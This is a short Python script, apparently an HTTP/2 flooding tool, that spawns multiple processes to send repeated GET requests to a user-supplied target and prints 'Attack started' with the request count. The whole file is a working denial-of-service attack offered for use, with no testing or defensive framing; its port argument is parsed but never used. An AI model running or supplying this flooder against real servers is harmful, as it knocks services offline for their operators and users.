import sys
import time
import ssl
import httpx
from multiprocessing import Process

if len(sys.argv) < 2:
    print (f"ERROR\n Usage: {sys.argv[0]} <Target> <Port> <Number_Process> <Number_Requests> <Delay>")
    sys.exit(1)

# Parse inputs
num_args = len(sys.argv)

host         = str(sys.argv[1])
port         = 80   if num_args < 3 else int(sys.argv[2])
num_process  = 1    if num_args < 4 else int(sys.argv[3])
num_requests = 1    if num_args < 5 else int(sys.argv[4])
delay        = 0.01 if num_args < 6 else int(sys.argv[5])

# Perform the request
def attack():
    for i in range(num_requests):
        with httpx.Client(http2=True) as client:
            r = client.get(host, timeout=None)
            print(f"{r}")

print (f"[#] Attack started on {host} || Port: {str(port)} || # Requests: {str(num_requests * num_process)}")

# Spawn process 
lst_proc = []

for i in range(num_process):
    procss = Process(target=attack, daemon=True)
    lst_proc.append(procss) 
    procss.start()
    # Adjusting this sleep time will affect requests per second
    time.sleep(delay)

for proc in lst_proc:
    if proc.is_alive():
        proc.join()
